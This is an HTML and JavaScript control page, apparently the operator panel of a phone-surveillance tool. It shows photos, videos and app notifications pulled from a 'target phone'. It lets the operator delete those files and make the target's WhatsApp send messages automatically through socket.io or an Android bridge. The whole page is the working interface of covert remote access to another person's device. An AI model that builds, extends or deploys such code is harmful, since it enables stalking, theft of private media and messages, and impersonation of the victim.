<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>Gallery</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:sans-serif}
body{background:#111;color:#eee;padding:10px}
.top{display:flex;gap:6px;margin-bottom:10px}
.top a{flex:1;text-align:center;padding:10px;background:#22c55e;color:#fff;text-decoration:none;border-radius:8px;font-size:13px}
.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px}
.item{background:#1c1c1c;border-radius:8px;overflow:hidden;position:relative}
.item img,.item video{width:100%;height:110px;object-fit:cover;display:block}
.item .nm{font-size:10px;padding:4px;color:#aaa;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.item .delbtn{position:absolute;top:3px;right:3px;background:#dc2626;border:0;color:#fff;border-radius:4px;padding:2px 6px;font-size:11px}
#big{display:none;position:fixed;inset:0;background:#000;z-index:10;text-align:center}
#big img,#big video{max-width:100%;max-height:100%}
#big .close{position:absolute;top:8px;right:12px;color:#fff;font-size:24px;background:#333;border:0;border-radius:50%;width:36px;height:36px}
.wa{display:flex;gap:6px;margin:10px 0}
.wa input{flex:1;padding:9px;border-radius:6px;border:0;background:#222;color:#eee;min-width:0}
.wa button{padding:9px 14px;border:0;border-radius:6px;background:#25d366;color:#fff}
.notif{border-bottom:1px solid #333;padding:6px;font-size:13px}
.notif .t{color:#888;font-size:11px}
h3{font-size:14px;margin:10px 0 6px}
</style>
</head>
<body>
<div class="top">
  <a href="/target.html">📷 Target</a>
  <a href="/view.html">👀 Viewer</a>
  <a href="/gallery.html" style="background:#16a34a">📁 Gallery</a>
</div>

<div class="wa">
  <input id="num" placeholder="WhatsApp number" inputmode="numeric">
  <input id="msg" placeholder="Message">
  <button onclick="sendWa()">📤 Send WA</button>
</div>

<h3>📸 Files (target pe 📷 Sync dabane se aati hain)</h3>
<div class="grid" id="grid"></div>
<p id="empty" style="color:#888;font-size:13px;margin-top:10px"></p>

<h3>💬 Notifications</h3>
<div id="notifs"></div>

<div id="big"><button class="close" onclick="document.getElementById('big').style.display='none'">✕</button><div id="bigc"></div></div>

<script>
const $=id=>document.getElementById(id);
function loadFiles(){
  fetch('/api/files').then(r=>r.json()).then(list=>{
    $('grid').innerHTML='';
    if(!list.length){ $('empty').textContent='Abhi koi file nahi — target phone pe 📷 Sync button dabao'; return; }
    $('empty').textContent='';
    list.forEach(f=>{
      const d=document.createElement('div'); d.className='item';
      const isImg=/\.(jpg|jpeg|png|gif|webp)$/i.test(f.name);
      const isVid=/\.(mp4|mkv|3gp|webm)$/i.test(f.name);
      const url='/files/'+f.name+'?v='+Date.now();
      d.innerHTML=(isImg?'<img src="'+url+'">':isVid?'<video src="'+url+'" preload="metadata"></video>':'<div style="height:110px;display:flex;align-items:center;justify-content:center">📄</div>')
        +'<button class="delbtn" onclick="delFile(\''+f.name+'\')">🗑</button>'
        +'<div class="nm">'+f.name+' · '+(f.size/1048576).toFixed(1)+'MB</div>';
      d.onclick=e=>{ if(e.target.className==='delbtn')return; showBig(url,isImg||isVid,isVid); };
      $('grid').appendChild(d);
    });
  }).catch(()=>{});
}
function showBig(url,media,video){
  $('big').style.display='block';
  $('bigc').innerHTML=video?'<video src="'+url+'" controls autoplay style="max-width:100%;max-height:100%"></video>':media?'<img src="'+url+'">':'<iframe src="'+url+'" style="width:90vw;height:80vh"></iframe>';
}
function delFile(name){
  if(!confirm('Delete '+name+'?'))return;
  fetch('/api/delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name})}).then(loadFiles);
}
function loadNotifs(){
  fetch('/api/notifs').then(r=>r.json()).then(list=>{
    $('notifs').innerHTML='';
    list.slice(0,50).forEach(n=>{
      const d=document.createElement('div'); d.className='notif';
      d.innerHTML='<b>'+n.app+'</b> — '+n.text+' <span class="t">'+new Date(n.time).toLocaleTimeString()+'</span>';
      $('notifs').appendChild(d);
    });
  }).catch(()=>{});
}
function sendWa(){
  const num=$('num').value.trim(), msg=$('msg').value.trim();
  if(!num||!msg) return alert('Number + message dono likho');
  const cmd={type:'send-wa',num:num,text:msg};
  if(window.AndroidBridge){ AndroidBridge.handleCommand(JSON.stringify(cmd)); alert('WhatsApp khulega — message auto bhejega'); }
  else { const s=io(); s.emit('cmd',cmd); s.close(); alert('Target ko command bheji gayi'); }
}
loadFiles(); loadNotifs();
setInterval(()=>{ loadFiles(); loadNotifs(); },15000);
</script>
<script src="/socket.io/socket.io.js"></script>
</body>
</html>
